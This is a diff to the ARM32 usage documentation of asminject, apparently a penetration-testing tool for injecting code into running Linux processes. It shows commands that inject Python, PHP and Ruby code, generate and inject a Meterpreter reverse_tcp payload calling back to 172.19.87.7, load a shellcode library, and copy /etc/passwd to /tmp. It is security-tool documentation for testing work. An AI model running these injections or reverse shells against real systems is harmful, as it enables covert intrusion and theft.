@@ -29,9 +29,11 @@ Terminal 2:
 
 pi       26611  1.8  0.8  14372  7160 pts/0    S+   15:16   0:00 python3 ./python_loop.py
 
-# ./get_relative_offsets.sh /usr/bin/python3.7 > relative_offsets-python3.7.txt
-
-# python3 ./asminject.py 26611 execute_python_code.s --arch arm32 --relative-offsets relative_offsets-python3.7.txt --non-pic-binary "/usr/bin/python.*" --stop-method "slow" --var pythoncode "print('injected python code');"
+# python3 ./asminject.py 26611 execute_python_code.s \
+   --arch arm32 --relative-offsets-from-binaries \
+   --non-pic-binary "/usr/bin/python.*" \
+   --stop-method "slow" \
+   --var pythoncode "print('injected python code');"
 
 ...omitted for brevity...
 [*] Handling '/usr/bin/python3.7' as non-PIC binary
@@ -67,9 +69,10 @@ Terminal 2:
 
 pi       24704  1.0  2.4  27720 21040 pts/0    S+   15:10   0:00 python2 ./python_loop.py
 
-# ./get_relative_offsets.sh /usr/bin/python2.7 > relative_offsets-python2.7.txt
-
-# python3 ./asminject.py 24704 execute_python_code.s --arch arm32 --relative-offsets relative_offsets-python2.7.txt --non-pic-binary "/usr/bin/python.*" --stop-method "slow" --var pythoncode "print('injected python code');"
+# python3 ./asminject.py 24704 execute_python_code.s \
+   --arch arm32 --relative-offsets-from-binaries \
+   --non-pic-binary "/usr/bin/python.*" --stop-method "slow" \
+   --var pythoncode "print('injected python code');"
 
                      .__            __               __
   _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
@@ -118,9 +121,11 @@ Terminal 2:
 
 pi        4955  0.0  1.6  62616 14068 pts/0    SN+  17:08   0:00 /usr/bin/php ./php_loop.php
 
-# ./get_relative_offsets.sh /usr/bin/php7.3 > relative_offsets-php7.3.txt
-
-# python3 ./asminject.py 4955 execute_php_code.s --arch arm32 --relative-offsets relative_offsets-php7.3.txt --non-pic-binary "/usr/bin/php.*" --stop-method "slow" --var phpcode "echo \\\"Injected PHP code\\\n\\\";" --var phpname PHP 
+# python3 ./asminject.py 4955 execute_php_code.s \
+   --arch arm32 --relative-offsets-from-binaries \
+   --non-pic-binary "/usr/bin/php.*" --stop-method "slow" \
+   --var phpcode "echo \\\"Injected PHP code\\\n\\\";" \
+   --var phpname PHP 
 
 [*] Handling '/usr/bin/php7.3' as non-PIC binary
 ...omitted for brevity...
@@ -152,7 +157,10 @@ Terminal 2:
 
 pi       12000  4.8  0.7  22144  6756 pts/0    Sl+  16:03   0:00 ruby ./ruby_loop.rb
 
-# python3 ./asminject.py 12000 execute_ruby_code.s --arch arm32 --relative-offsets relative_offsets-libruby2.5.5.txt --stop-method "slow" --var rubycode "puts(\\\"Injected Ruby code\\\")"
+# python3 ./asminject.py 12000 execute_ruby_code.s \
+   --arch arm32 --relative-offsets-from-binaries \
+   --stop-method "slow" \
+   --var rubycode "puts(\\\"Injected Ruby code\\\")"
 
 ...omitted for brevity...
 [+] Done!
@@ -180,7 +188,8 @@ $ sudo python3 practice/python_loop.py
 In a separate terminal, generate a Meterpreter payload, then launch a listener:
 
 ```
-# msfvenom -p linux/armle/meterpreter/reverse_tcp -f raw -o lmrtarm11443 LHOST=172.19.87.7 LPORT=11443
+# msfvenom -p linux/armle/meterpreter/reverse_tcp -f raw \
+   -o lmrtarm11443 LHOST=172.19.87.7 LPORT=11443
 
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: armle from the payload
@@ -212,8 +221,9 @@ pi        5283  0.3  5.1  54224 44908 pts/1    S    13:00   0:06 gdb --args pyth
 pi        5487  0.0  0.9  23524  8008 pts/1    SNl+ 13:29   0:00 /usr/bin/python3 ./python_loop.py
 
 
-# python3 ./asminject.py 5487 execute_precompiled.s --arch arm32 --stop-method "slow" --precompiled lmrtarm11443
-...omitted for brevity...
+# python3 ./asminject.py 5487 execute_precompiled.s \
+   --arch arm32 --stop-method "slow" \
+   --precompiled lmrtarm11443
 ```
 
 You should see something like the following pop up in the third terminal:
@@ -249,9 +259,10 @@ The `execute_precompiled_threaded.s` payload is identical to the `execute_precom
 This payload requires relative offsets for `libpthread` shared library used by the target process.
 
 ```
-# ./get_relative_offsets.sh /lib/arm-linux-gnueabihf/libpthread-2.28.so > relative_offsets-libpthread-2.28.txt
-
-# python3 ./asminject.py 5487 execute_precompiled_threaded.s --arch arm32 --relative-offsets relative_offsets-libpthread-2.28.txt --stop-method "slow" --precompiled lmrtarm11443
+# python3 ./asminject.py 5487 execute_precompiled_threaded.s \
+   --arch arm32 --relative-offsets-from-binaries \
+   --stop-method "slow" \
+   --precompiled lmrtarm11443
 ...omitted for brevity...
 ```
 
@@ -270,9 +281,10 @@ This payload requires relative offsets for the `libdl` shared library used by th
 As of this writing, generating an ARM32 `elf-so` Meterpreter payload doesn't work for me using `msfvenom`, but you can copy/paste some raw meterpreter shellcode into `asm_development/execute_inline_shellcode.c` and compile it into a .so file using the instructions in the source code.
 
 ```
-# ./get_relative_offsets.sh /lib/arm-linux-gnueabihf/libdl-2.28.so > relative_offsets-libdl-2.28.txt
-
-# python3 ./asminject.py 5487 dlinject.s --arch arm32 --relative-offsets relative_offsets-libdl-2.28.txt --stop-method "slow" --var librarypath "/home/pi/asminject/execute_inline_shellcode.so"
+# python3 ./asminject.py 5487 dlinject.s \
+   --arch arm32 --relative-offsets-from-binaries \
+   --stop-method "slow" \
+   --var librarypath "/home/pi/asminject/execute_inline_shellcode.so"
 ```
 
 The injection comes with the same warnings as for `execute_precompiled.s*`, above.
@@ -286,23 +298,23 @@ This payload requires one variable: `librarypath`, which should point to the lib
 This payload requires relative offsets for the `libdl` and `libpthread` shared libraries used by the target process.
 
 ```
-# ./get_relative_offsets.sh /lib/arm-linux-gnueabihf/libdl-2.28.so > relative_offsets-libdl-2.28.txt
-
-# ./get_relative_offsets.sh /lib/arm-linux-gnueabihf/libpthread-2.28.so > relative_offsets-libpthread-2.28.txt
-
-# python3 ./asminject.py 5750 dlinject_threaded.s --arch arm32 --relative-offsets relative_offsets-libdl-2.28.txt --relative-offsets relative_offsets-libpthread-2.28.txt --stop-method "slow" --var librarypath "/home/pi/asminject/execute_inline_shellcode.so"
+# python3 ./asminject.py 5750 dlinject_threaded.s \
+   --arch arm32 --relative-offsets-from-binaries \
+   --relative-offsets-from-binaries --stop-method "slow" \
+   --var librarypath "/home/pi/asminject/execute_inline_shellcode.so"
 ```
 
 This injection comes with the same warnings as for `execute_precompiled_threaded.s`, above.
-
-
 
 ## Create a world-readable copy of a file using only Linux syscalls
 
 Use of this payload is identical to the x86-64 equivalent except for the `--arch arm32` option:
 
 ```
-python3 ./asminject.py 4397 copy_file_using_syscalls.s --arch arm32 --stop-method "slow" --var sourcefile "/etc/passwd" --var destfile "/tmp/bishopfox.txt"
+python3 ./asminject.py 4397 copy_file_using_syscalls.s \
+   --arch arm32 --stop-method "slow" \
+   --var sourcefile "/etc/passwd" \
+   --var destfile "/tmp/bishopfox.txt"
 ```
 
 ## Create a copy of a file using buffered read/write libc calls
@@ -310,5 +322,9 @@ python3 ./asminject.py 4397 copy_file_using_syscalls.s --arch arm32 --stop-metho
 Use of this payload is identical to the x86-64 equivalent except for the `--arch arm32` option:
 
 ```
-# python3 ./asminject.py 4397 copy_file_using_libc.s --arch arm32 --relative-offsets relative_offsets-libc-2.28.txt --stop-method "slow" --var sourcefile "/etc/passwd" --var destfile "/tmp/bishopfox.txt"
+# python3 ./asminject.py 4397 copy_file_using_libc.s \
+   --arch arm32 --relative-offsets-from-binaries \
+   --stop-method "slow" \
+   --var sourcefile "/etc/passwd" \
+   --var destfile "/tmp/bishopfox.txt"
 ```
